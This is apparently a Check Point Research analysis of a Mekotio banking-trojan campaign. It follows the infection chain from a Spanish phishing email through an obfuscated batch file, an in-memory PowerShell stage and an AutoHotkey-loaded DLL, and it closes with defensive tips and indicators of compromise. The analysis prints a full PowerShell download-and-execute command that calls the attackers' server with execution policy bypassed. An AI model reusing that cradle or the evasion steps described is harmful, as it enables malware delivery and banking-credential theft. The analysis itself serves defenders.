The new campaign started right after the Spanish Civil\n[Guard announced the arrest of 16 people involved with Mekotio distribution in July 2021. It](https://www.interior.gob.es/prensa/noticias/-/asset_publisher/GHU8Ap6ztgsg/content/id/13552853)\n\n\n-----\n\nappears that the gang behind the malware were able to narrow the gap quickly and change\ntactics to avoid detection.\n\n[We assume that the main cybercrime groups are operating from Brazil and they collaborated](https://therecord.media/spain-arrests-16-for-distributing-the-mekotio-and-grandoreiro-banking-trojans/)\nwith Spanish gangs to distribute malwares. The arrest stopped the activity of the Spanish\ngangs but not the main cybercrime groups.\n\nMekotio’s new infection vector contains these unprecedented elements:\n\nA stealthier batch file with at least two layers of obfuscation.\nNew fileless PowerShell script that runs directly in memory.\nUse of Themida v3 for packing the final DLL payload.\n\nIn the last 3 months, we saw approximately 100 attacks use new, simple obfuscation\ntechniques, with the help of a substitution cipher, to hide the first module of the attack. This\nsimple obfuscation technique allows it to go undetected by most of the AntiVirus products.\n\n**Figure 1 – Low detection rate of Mekotio batch file on VirusTotal**\n\nDuring July and August, Check Point Threat Prevention Engine detected and blocked a wave\nof malicious batch files with unique obfuscation patterns. When we looked into it, we saw the\nfollowing attack flow:\n\nAttack flow\n\n\n-----\n\n**Figure 2 – Mekotio new attack flow**\n\n1. The infection starts with a phishing email containing a link to a zip archive or a zip file\n\nas an attachment. The message lures the victim to download and extract the zip\ncontent.\n2. When the user clicks on the zip content, the batch script is executed.\n3. The batch script runs a “PowerShell Download Cradles” which downloads and runs a\n\nPowerShell script on the memory.\n4. The PowerShell script:\n\nChecks if the target is located in Latin America.\nMakes sure it is not running in a virtual machine.\nSets up persistence in the victim’s operating system.\nDownloads a secondary zip archive.\n5. The secondary zip archive contains three files:\n\n1.\n\n1. AutoHotkey (AHK) interpreter (AutoHotkey is a free, open-source scripting\n\nlanguage for Windows that allows users to easily create small to complex scripts\nfor all kinds of tasks).\n2. Mekotio DLL usually packed with Themida v3.\n3. AutoHotkey script.\n\n6. Those 3 files are extracted and saved in a new directory on the infected system.\n\n7. The PowerShell script calls the AutoHotkey interpreter to run the AHK script.\n\n\n-----\n\n8. The AutoHotkey script runs the DLL payload.\n\n9. The DLL contains the main Mekotio banker functionality for actions such as stealing\naccess credentials for electronic banking portals and a password stealer.\n\n10. The stolen data is sent to the C&C server.\n\nLet’s now take a closer look at the malware components.\n\nPhishing email\n\nThe phishing email, which is written in Spanish, claims that there is a digital tax receipt\npending submission. When the victims click the link in the email, a malicious zip archive is\ndownloaded from a malicious website.\n\n**Figure 3 – Phishing email**\n\nBatch file\n\nThe batch file extracted from the first zip archive has two layers of obfuscation and often\ncontains a file name which starts with “Contacto”.\n\n\n-----\n\n**Figure 4 – Snippet of the obfuscated batch script**\n\nThe first layer of the obfuscation is a simple substitution cipher. Substitution ciphers encrypt\nplaintext by replacing each symbol in the plaintext with the corresponding symbol from the\n[lookup table. The source code of this obfuscation was probably taken from here.](https://www.dostips.com/forum/viewtopic.php?f=3&t=7990&start=15)\n\nEach batch file contains these two lines:\n\n**Figure 5 – Substitution arrays**\n\nThese lines define the substitution and we can use them to deobfuscate the first layer.\n\nAfter deobfuscating the first layer, we get another layer of obfuscation:\n\n**Figure 6 – Layer 2 of obfuscation**\n\n\n-----\n\nIn this layer, slices of the command are saved in different environment variables. The values\nin lines 4-13 are concatenated, resulting the following command:\n\npowershell.exe -ep bypass -nop -win 1\nThere is also a PowerShell command saved in the environment variable in the example\ncalled “mEeWtg9Pxm” (line 18), which is produced as a result of concatenating letters from\nthe environment variable in the example called “o7cro6vX” (line 3).\nThe output of executing the lines 3 and 18 is the following PowerShell command:\n\nPutting everything together, the batch file executes the following command:\n\n**echo iex(“IEX(New-Object Net.WebClient).DownloadString(‘https://13[.]66.15.167/m/?**\na=Z0DEXUBSWD7FE45T3JHBMMJXCW3DON98P9LY3SRT’)”); | powershell.exe -ep\nbypass -nop -win 1\n\nAfter executing the command, a PowerShell script is downloaded to the memory and is\nexecuted.\n\nPowerShell script\n\nThe first thing the script does is check the location of the infected system using the ipinfo.io\nservice. If the system is not in one of these countries, (Brazil, Chile, Mexico, Spain and\nPeru), then the attack is terminated.\n\n**Figure 7 – Checking the location of the infected system**\n\n\n-----\n\nNext, the script checks if it is running in a virtual machine: it compares the computer model to\nthe strings ‘VMware Virtual Platform’ and ‘Virtual Machine’, and exits if the computer model is\none of the above.\n\n**Figure 8 – Checking if the computer is a virtual machine**\n\nThe next thing the script does is to create an empty file, used as a footprint, whose name is\nthe current date. This lets it know if it already ran in the system. If the file already exists, the\nscript stops the execution.\n\n**Figure 9 – Footprint file creation**\n\nAfter checking the footprint file, a directory with a random name whose length is 8 is usually\ncreated in the ProgramData Directory.\n\n**Figure 10 – Creating a new directory**\n\nNext, a secondary zip file with a random file name is downloaded to the directory.\n\n\n-----\n\n**Figure 11 – Downloading the zip file**\n\nThe downloaded zip archive contains three files: Mekotio payload DLL, AutoHotkey\ninterpreter and AutoHotkey script. After downloading the zip archive, the script extracts and\nrenames each file in the zip archive with a random name and saves it in the created\ndirectory.\n\nThe script checks the size of the extracted files to distinguish between the type and the\npurpose of the files. The script renames the files, adding the extension according to the\ndetected file type.\n\n**Figure 12 – Renaming files from the downloaded zip**\n\n\n-----\n\nAfter renaming the extracted files, a shortcut to the AutoHotkey is created in the AppData\ndirectory. The arguments to the shortcut are the AutoHotkey script and the Mekotio DLL.\nAn AutoHotkey process is started using the shortcut.\n\n**Figure 13 – Creating the shortcut and starting AutoHotkey process**\n\nFinally, persistence is gained by adding a new value to the following registry key:\n“HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run”\n\nThis runs the AutoHotkey with the AHK script and the Mekotio DLL as arguments.\n\n**Figure 14 – Adding a new value to the registry**\n\nThe AHK script uses DllCall to run the 4th exported DLL function. By executing the\nAutoHotkey script, the DLL looks like part of the AutoHotkey execution. As final payloads, we\nsee the DLL which contains the well-known and well-covered Mekotio Banker.\n\n**Conclusion**\n\nBanking Trojans are a common malware used in attacks targeting countries in Latin America.\n\nOne of the characteristics of those bankers, such as Mekotio, is the modular attack which\ngives the attackers the ability to change only a small part of the whole in order to avoid\ndetection.\n\nCPR see a lot of old malicious code used for a long time, and yet the attacks manage to stay\nunder the radar of AVs and EDR solutions by changing packers or obfuscation techniques\nsuch as a substitution cipher.\n\nOur analysis of this campaign highlights the efforts that attackers make to conceal their\nmalicious intentions, bypass security filtering and trick users. To protect yourself against this\ntype of attack, be suspicious of any email or communication from a familiar brand or\n\n\n-----\n\norganization that asks you to click on a link or open an attached document.\n\nHere are some practical tips to help keep your data safe:\n\n1. Beware of lookalike domains, spelling errors in emails or websites, and unfamiliar email\n\nsenders.\n2. Be cautious with files received via email from unknown senders, especially if they\n\nprompt for a certain action you would not usually do.\n3. Make sure you are ordering goods from an authentic source. One way to do this is to\n\nNOT click on promotional links in emails, and instead, Google your desired retailer and\nclick the link from the Google results page.\n4. Beware of “special” offers that don’t appear to be reliable or trustworthy purchase\n\nopportunities.\n5. Make sure you do not reuse passwords between different applications and accounts.\n\nOrganizations can prevent zero-day attacks with an end-to-end cyber architecture used to\nblock deceptive phishing sites and provide alerts on password reuse in real time. Check\nPoint Infinity is effective because it combines two key ingredients: full convergence across all\nattack surfaces and all attack vectors, and advanced prevention that can tackle the most\nsophisticated zero-day phishing and account takeover attacks.\n\n_Check Point Threat Emulation provides protection against this threat:_\n\nWin.PSBypass.A\nWins.obfusBat.A\n\n**Indicators of Compromise**\n\nBatch Sha1\n\n09a536c2260d01fe9de33b905cde75685360cd3d\n\n106a719cecf90db98fb3a79bf22435acafcf6e4f\n\n134b1b4e2726117b0bf5ac7670f37e10f40ccc31\n\n24965ac9150a86085aa36b953ef3b181ef2007b5\n\n40ce61f375fbebf809bf55f7dba93c890ac990ac\n\n412c522f180d6d773b892e92e45c72780a9f491c\n\n4178e160fdff914718b55ded12808189939453bb\n\n561bff9aa9c807b937b460ef3d2cf0f710ff3eb5\n\n5a9d4e41d677d0caadf232b7cdcfe51cde38ed77\n\n\n-----\n\n5bc7099f709e1ae1ac0354fa99a32703e6306a6d\n\n87cbb5e4bae97f51e22668634ebc764e6a863a68\n\n87d9f2c95835a1ad9c2397d0f776eb8f2e08125c\n\nc3b93e8d68614447f462d001b7a44ccc7c3c9e52\n\nc7b3f093a320ffd2b9667c79622a42d88e2b68ac\n\nd1404272a3d23b143fc9fec377577cab715d9838\n\nd884cd7ac1664d1227214fe21e6ef7f657fa69a5\n\ndfde9908dc5395f9dfb4b9dae00f4a3fb555af5c\n\nfc24562b2efc77dc6174abf592fe68051751b678\n\nLinks to first zip\n\n20.206.121[.]1/arquivo.php\n\n40.90.192[.]58/factura0001450000g9.zip\n\nlianzafacture[.]eu/75rg6ty7.php?e=desktop-pc\n\nonflicitoesar[.]eu/75rg6ty7.php?e=desktop-pc\n\nontabilidadms[.]eu/75rg6ty7.php?e=desktop-pc\n\nc2-3-143-67-171.us-east-2.compute.amazonaws[.]com/arquivo.php\n\ntaingenieria[.]eu/75rg6ty7.php?e=desktop-pc\n\nerdfacturaa[.]top/arquivo.php\n\ndfcompros[.]com/arquivo.php\n\nemg-compl[.]com/75rg6ty7.php?e=desktop-pc\n\npyddteres[.]hopto.org/75rg6ty7.php?e=desktop-pc\n\nubbencion[.]australiaeast.cloudapp.azure[.]com/75rg6ty7.php?e=desktop-pc\n\nubbencion[.]eu/75rg6ty7.php?e=desktop-pc\n\n\n-----",
